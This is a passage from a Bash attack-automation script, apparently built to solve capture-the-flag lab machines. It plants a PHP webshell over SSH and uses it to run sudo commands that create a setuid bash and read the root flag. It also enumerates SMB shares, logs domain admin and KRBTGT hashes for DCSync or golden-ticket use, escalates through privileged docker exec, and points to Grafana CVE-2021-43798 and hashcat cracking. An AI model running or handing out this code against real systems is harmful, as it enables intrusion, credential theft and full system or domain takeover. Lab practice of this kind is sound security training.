            # --- Auto-escalate: LimeSurvey mounted path → container webshell → setuid bash ---
            if [ "$(get has_limesurvey)" = "yes" ] || [ "$user" = "limesvc" ]; then
                LSPORT=$(get limesurvey_port)
                [ -z "$LSPORT" ] && LSPORT=80

                # Write webshell via base64 (avoids PHP $_GET escaping issues)
                PAYLOAD_B64=$(echo "<?php system(\$_GET['c']); ?>" | base64)
                $SSHPASS -p "$pass" ssh $SSH_OPTS $SSH_PASS_OPTS "$user@$TARGET" \
                    "echo '$PAYLOAD_B64' | base64 -d > /opt/limesurvey/cmd.php" 2>/dev/null

                WSHELL_TEST=$(curl -s -m 5 "http://$TARGET:$LSPORT/survey/cmd.php?c=id" 2>/dev/null)
                if echo "$WSHELL_TEST" | grep -q "uid="; then
                    log "  [+] Webshell on container — creating setuid bash"

                    # Copy and chmod bash via URL-encoded sudo commands
                    CP_CMD=$(python3 -c "import urllib.parse; print(urllib.parse.quote('echo $pass | sudo -S cp /bin/bash /var/www/html/survey/bash'))")
                    curl -s -m 10 "http://$TARGET:$LSPORT/survey/cmd.php?c=$CP_CMD" 2>/dev/null > /dev/null

                    CHMOD_CMD=$(python3 -c "import urllib.parse; print(urllib.parse.quote('echo $pass | sudo -S chmod +s /var/www/html/survey/bash'))")
                    curl -s -m 10 "http://$TARGET:$LSPORT/survey/cmd.php?c=$CHMOD_CMD" 2>/dev/null > /dev/null

                    ROOT_FLAG=$($SSHPASS -p "$pass" ssh $SSH_OPTS $SSH_PASS_OPTS "$user@$TARGET" \
                        "/opt/limesurvey/bash -p -c 'cat /root/root.txt'" 2>/dev/null | grep -oE '[a-f0-9]{32}' | head -1)
                    [ -n "$ROOT_FLAG" ] && log "  [FLAG] ROOT FLAG: $ROOT_FLAG" && pass "$ROOT_FLAG" root_flag

                    # Cleanup
                    $SSHPASS -p "$pass" ssh $SSH_OPTS $SSH_PASS_OPTS "$user@$TARGET" \
                        "rm -f /opt/limesurvey/cmd.php /opt/limesurvey/bash" 2>/dev/null
                fi
            fi
            break
        fi
    done
fi

################################################################
# PHASE 5: POST-EXPLOITATION
################################################################
log "PHASE 5: Post-Exploitation"

if [ "$OS_TYPE" = "WINDOWS" ]; then
    CREDS=$(get creds)
    if [ -n "$CREDS" ]; then
        USER=$(echo "$CREDS" | cut -d: -f1)
        PASS=$(echo "$CREDS" | cut -d: -f2)
        DOMAIN=$(get domain)

        log "  [*] Enumerating shares..."
        $NXC smb "$DOMAIN" -u "$USER" -p "$PASS" --shares 2>/dev/null | grep -v "READ\|Default\|IPC\|ADMIN" | tail -5

        log "  [*] Searching for user flag..."
        for share in Notes Trainees Users SYSVOL NETLOGON; do
            $NXC smb "$DOMAIN" -u "$USER" -p "$PASS" --share "$share" --get-file user.txt user_flag.txt 2>/dev/null | grep -q "\[+]" && log "  [+] User flag in \\\\$share\\"
        done
    fi

elif [ "$OS_TYPE" = "LINUX" ]; then
    if [ -f "$STATE/grafana_users" ] && [ -s "$STATE/grafana_users" ]; then
        log "  [*] Users ready for SSH: $(tr '\n' ' ' < "$STATE/grafana_users")"
    fi

    HASH=$(get hash_hex)
    SALT=$(get hash_salt)
    if [ -n "$HASH" ] && [ -n "$SALT" ]; then
        log "  [*] Hash ready for cracking (mode 10900)"
        log "  [*] Run: hashcat -m 10900 hash.txt rockyou.txt"
        log "  [*] Or try common passwords from rockyou.txt"
    fi
fi

################################################################
# PHASE 6: PRIVILEGE ESCALATION
################################################################
log "PHASE 6: Privilege Escalation"

if [ "$OS_TYPE" = "WINDOWS" ]; then
    ADMIN_HASH=$(get admin_hash)
    if [ -n "$ADMIN_HASH" ]; then
        log "  [+] Domain Admin hash: $ADMIN_HASH"
        log "  [*] Use for DCSync or golden ticket"
        if [ -n "$(get krbtgt_hash)" ]; then
            log "  [+] KRBTGT hash: $(get krbtgt_hash)"
        fi
    elif [ "$(get has_adcs)" = "yes" ] && [ -n "$(get creds)" ]; then
        log "  [*] ADCS ESC1 exploitable -- see Phase 4 output"
    fi

elif [ "$OS_TYPE" = "LINUX" ]; then
    SUDO_DOCKER=$(get sudo_docker)
    SSH_USER=$(get ssh_user)
    SSH_PASS=$(get ssh_pass)
    if [ -n "$SUDO_DOCKER" ] && [ -n "$SSH_USER" ] && [ -n "$SSH_PASS" ]; then
        log "  [+] Docker sudo: $SUDO_DOCKER"
        CID=$(get grafana_hostname)
        if [ -n "$CID" ]; then
            log "  [*] Checking docker exec as root on container $CID..."
            whoami_out=$($SSHPASS -p "$SSH_PASS" ssh $SSH_OPTS $SSH_PASS_OPTS "$SSH_USER@$TARGET" "sudo /snap/bin/docker exec -u root --privileged $CID whoami 2>/dev/null" 2>/dev/null)
            if [ "$whoami_out" = "root" ]; then
                log "  [+] Root access via docker exec!"
                pass "$CID" docker_cid
            fi
        fi
    fi
fi

################################################################
# PHASE 7: FLAG CAPTURE
################################################################
log "PHASE 7: Flag Capture"
log ""

# Windows: show actual captured results
if [ "$OS_TYPE" = "WINDOWS" ]; then
    if [ "$(get machine_type)" = "rdp_kiosk" ]; then
        log "  [!] RDP Kiosk -- attacker must host RunasCs + nc64 on HTTP server"
        log "  Steps after kiosk bypass:"
        while IFS= read -r line; do echo "$line"; done < "$STATE/log" | grep "    [0-9]\." | tail -6
    else
        [ -n "$(get user_flag)" ] && log "  [FLAG] USER FLAG: $(get user_flag)"
        [ -n "$(get root_flag)" ] && log "  [FLAG] ROOT FLAG: $(get root_flag)"
        [ -n "$(get admin_hash)" ] && log "  [*] Admin NT hash: $(get admin_hash)"
        [ -n "$(get krbtgt_hash)" ] && log "  [*] KRBTGT hash: $(get krbtgt_hash)"
        [ -n "$(get backdoor_user)" ] && log "  [*] Domain Admin backdoor: $(get backdoor_user)"
        if [ -n "$(get creds)" ] && [ -z "$(get user_flag)" ] && [ -z "$(get root_flag)" ]; then
            log "  [*] Credentials found but no flags captured automatically"
            log "  [*] Manual: nxc smb $(get domain) -u $(get creds | cut -d: -f1) -p $(get creds | cut -d: -f2) --spider Notes --pattern user.txt"
        fi
        if [ -z "$(get creds)" ] && [ -z "$(get admin_hash)" ]; then
            log "  [!] No credentials found. Try manual:"
            log "      ad-recon.sh $TARGET"
            log "      nxc smb $TARGET -u Guest -p '' --rid-brute 2000"
        fi
    fi

# Linux: show actual captured results
elif [ "$OS_TYPE" = "LINUX" ]; then
    [ -n "$(get user_flag)" ] && log "  [FLAG] USER FLAG: $(get user_flag)"
    [ -n "$(get root_flag)" ] && log "  [FLAG] ROOT FLAG: $(get root_flag)"
    [ -n "$(get grafana_hostname)" ] && log "  [*] Container ID: $(get grafana_hostname) -- use for docker escape"
    [ -n "$(get tmux_session)" ] && log "  [*] tmux session: $(get tmux_session) -- use for nano GTFOBins"
    if [ -n "$(get admin_pass)" ]; then
        log "  Admin web password: $(get admin_pass)"
        [ -n "$(get ssh_user)" ] && log "  SSH user: $(get ssh_user)"
        [ -n "$(get tmux_session)" ] && log "  tmux session: $(get tmux_session) -- sudo nano GTFOBins"
    fi
    [ "$(get cve_2021_43798)" = "yes" ] && log "  Grafana CVE-2021-43798: extract DB -> crack hash -> SSH"
    [ -n "$(get grafana_hostname)" ] && log "  Container: $(get grafana_hostname) -- docker exec privileged"
    [ "$(get has_jmx)" = "yes" ] && log "  JMX (port 2222): beanshooter tonka chain attempted"
fi

log ""
log "=== PIPELINE COMPLETE ==="
log "State saved in: $STATE/"
log ""

echo ""
echo "Pipeline complete. See $STATE/log for details."

# Cleanup stale processes
pkill -f "http.server 8080" 2>/dev/null
pkill -f "nc.*4444" 2>/dev/null
